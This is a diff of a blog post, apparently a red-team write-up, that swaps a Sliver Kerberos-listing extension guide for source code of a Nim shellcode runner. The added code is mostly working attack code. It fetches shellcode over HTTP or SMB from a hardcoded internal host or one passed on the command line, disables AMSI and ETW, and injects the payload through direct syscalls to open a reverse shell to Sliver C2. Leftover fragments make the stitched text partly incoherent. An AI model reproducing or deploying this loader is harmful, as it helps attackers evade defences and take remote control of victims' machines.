@@ -42,104 +42,155 @@ So the methods used then become these native ones:
 
 |*Windows API*       |*Native API*            | 
 ---------------------|------------------------|
+|OpenProcess         |NtOpenProcess           |
 |VirtualAllocEx      |NtAllocateVirtualMemory |
 |WriteProcessMemory  |NtWriteVirtualMemory    | 
-|VirtualProtectEx    |NtProtectVirtualMemory  |
 |CreateRemoteThread  |NtCreateThreadEx        |
 
 
-### Coding
+### Coding - Main Module
 
+I now wanted to put all this to the test and cobble together a Nim shellcode runner to take some remote shellcode from Sliver C2 over http or smb, open a process, inject the shellcode into it and execute the remote thread to give me my reverse shell back to Sliver.
 
+I started by creating my main module to read in the parameters from the command line such as whether the payload is accessed via SMB or http as well as things like the IP or port/share to get the data.
 
+I also have it decrypting the payload if it arrives encrypted by Sliver but on speaking to others on the Bishop Fox repo we think the encryption Sliver can do automatically may not be working currently so I was unable to verify if this works. This removes the iv from the first 16 bytes of a Sliver payload when required then passes it to a decrypt function to decrypt the AES128 CBC encryption that Sliver uses.
 
+For now here is the main method created for my purposes.
 
-Before I go any further, I want to say that I am standing on the shoulders of giants here and that I didn't build this from scratch but just refactored the Cobalt Strike BOF created by OutflankNL to now work with Sliver.
+{% highlight powershell %} 
 
-To get BOF's to work with Sliver you ideally want 3 files:
+when isMainModule:
 
-- An x86 object file for 32 bit systems.
-- An x64 object file for 64 bit systems.
-- An extension.json file shown below to tell Sliver where the files are located and other config information.
+        let key: seq[byte] = toByteSeq("KEYDEFGHIHKLOMNA")
+        let iv:  seq[byte] = toByteSeq("IVCDEFGHIHKLOMNA")
+        
+        if(paramCount() > 0 and $paramStr(1) == "-h"):
+            echo ("Usage: <SLIVER or CS or NONE encryption type> -m <MODE> <IP> <SHARE or PORT> <FILE_NAME>")
+            echo ("Example: sliver -m smb  192.168.55.15 tools myfile.bin")
+            echo ("Example: none   -m http 192.168.55.15 8080  myfile.bin")
+            quit()
+        
+        antiEmulation()
+    
+        var amsiPatched = patchAMSI()
+        echo "[patchAMSI] AMSI disabled: ", amsiPatched
 
-**extension.json:**
-{% highlight powershell %}
-{
-    "name": "klist",
-    "version": "1.0.0",
-    "command_name": "klist",
-    "extension_author": "Cyb3rC3lt",
-    "original_author": "OutflankNl",
-    "help": "Displays a list of currently cached Kerberos tickets.",
-    "long_help": "",
-    "depends_on": "coff-loader",
-    "entrypoint": "go",
-    "files": [
-        {
-            "os": "windows",
-            "arch": "amd64",
-            "path": "klist.x64.o"
-        },
-        {
-            "os": "windows",
-            "arch": "386",
-            "path": "klist.x86.o"
-        }
-    ],
-    "arguments": [
-        {
-            "name": "purge",
-            "desc": "Purge the cached Kerberos tickets.",
-            "type": "wstring",
-            "optional": true
-        }
-    ]
-}
+        var etwPatched = patchETW()
+        echo "[patchETW] ETW disabled: ", etwPatched
+
+        var shellcode: seq[byte]
+        var actual: seq[byte]
+
+        #If no parameters passed use hardcoded http url from the code to be customised per network
+        if (paramCount() == 0):    
+            var client = newHttpClient()
+            var url = "http://10.90.248.103:445/EVENTUAL_GREENHOUSE.woff"
+            var response: string = client.getContent(url) 
+            shellcode = toByteSeq(response)                 
+            runShellcode(shellcode) 
+
+        #Download the payload over http
+        elif ($paramStr(3) == "http"):    
+            var client = newHttpClient()
+            var url = "http://" & $paramStr(4) & ":" & $paramStr(5) & "/" & $paramStr(6)
+            var response: string = client.getContent(url) 
+            shellcode = toByteSeq(response)
+
+            #If Sliver remove the iv from first 16 bytes
+            if ($paramStr(1) == "sliver"):                 
+                for i in 16  ..< shellcode.len:
+                    actual.add(shellcode[i])
+                shellcode = decrypt(actual,key,iv)                   
+            runShellcode(shellcode)      
+        
+        #Download the payload over smb  
+        elif ($paramStr(3) == "smb"):
+            let filename = "\\\\" & $paramStr(4) & "\\" & $paramStr(5) & "\\" & $paramStr(6)
+            var file: FILE = open(filename, fmRead)
+            var length = file.getFileSize()
+            var shellcode = newSeq[byte](length)
+            discard file.readBytes(shellcode, 0, length)
+            
+            #If Sliver remove the iv from first 16 bytes
+            if ($paramStr(1) == "sliver"):                 
+                for i in 16  ..< shellcode.len:
+                    actual.add(shellcode[i])
+                shellcode = decrypt(actual,key,iv)
+            runShellcode(shellcode)
 {% endhighlight %}
 
-### Install The Release
+### Coding - Shellcode Running via Syscalls
 
-The quickest way to add these 3 files to Sliver is as follows.
+Now that I have my shellcode received over the network from my main method, I needed to call the 4 methods earlier to get my Shellcode into memory. I created the runShellcode methos as shown below.
 
-1. Download the zip file from my releases [here](https://github.com/Cyb3rC3lt/SliveryArmory/releases/tag/v1.0.0)
-2. Extract it to a folder on your machine named klist for argument sake.
-3. Within Sliver load the folder you extracted with this command:
-{% highlight powershell %}
-extensions install /home/david/klist
+{% highlight powershell %} 
+proc runShellcode(shellcode: seq[byte]): void =
+
+    var SYSCALL_STUB_SIZE: int = 23;
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)
+
+    cid.UniqueProcess = GetCurrentProcessId()
+
+    let cProcess = GetCurrentProcessId()
+    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, cProcess)
+
+    let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+
+    var syscallStub_NtAlloc:  HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    var syscallStub_NtWrite:  HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+    var oldProtection: DWORD = 0
+
+    # define NtOpenProcess
+    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP));
+    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtAllocateVirtualMemory
+    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
+    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtWriteVirtualMemory
+    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
+    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtCreateThreadEx
+    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate));
+    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    var status: NTSTATUS
+    var success: BOOL
+    var bytesWritten: SIZE_T
+
+    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP));
+    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
+    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
+    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));
+    
+    status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS, &oa, &cid)
+    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE); 
+    status = NtWriteVirtualMemory(pHandle, ds, shellcode[0].addr, sc_size-1, addr bytesWritten);
+    status = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, NULL, pHandle,ds, NULL, FALSE, 0, 0, 0, NULL);
+
+    echo "Finished: Check for your shell after a few seconds"
+    WaitForSingleObject(tHandle, -1)
+    CloseHandle(tHandle)
+
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
 {% endhighlight %}
-4. Then load the extension into Sliver as follows:
-{% highlight powershell %}
-extensions load /home/david/.sliver-client/extensions/klist
-{% endhighlight %}
 
-### Install From Source
 
-1. Make sure that Mingw-w64 (including mingw-w64-binutils) has been installed.
-2. Download the source folder above.
-3. Within that folder execute "make" to compile the object files.
-4. Now you have the object files like they appear in the release zip folder so continue from Step 1 of the release method.
-
-### Usage
-
-To display all the cached Kerberos tickets issue the command:
-{% highlight powershell %}
-klist
-{% endhighlight %}
-To purge all the cached Kerberos tickets issue the command:
-{% highlight powershell %}
-klist purge
-{% endhighlight %}
-### Screenshots
-
-<img src="https://user-images.githubusercontent.com/33097451/274965338-4ac8bf58-9134-4c1d-9d00-efe0bee11b75.png"/>
-
-<img src="https://user-images.githubusercontent.com/33097451/274966113-146cafe6-f3c8-43c6-ad8c-2ad417bfd129.png"/>
-
-After speaking to the Sliver devs over at the BloodHoundGang Slack channel, they have said they would like to include it in the Armory. They advised me to open an issue on their Github so it can be verified for inclusion. This is now located here:
 
 [https://github.com/BishopFox/sliver/issues/1433](https://github.com/BishopFox/sliver/issues/1433)
 
-This process has been lots of fun and a great learning experience. It gave me an opportunity to work with such an interesting C2 framework as Sliver and to improve my knowledge on how it's BOF framework operates. Hope it proved to be informative and happy hacking!
+
 
 
 
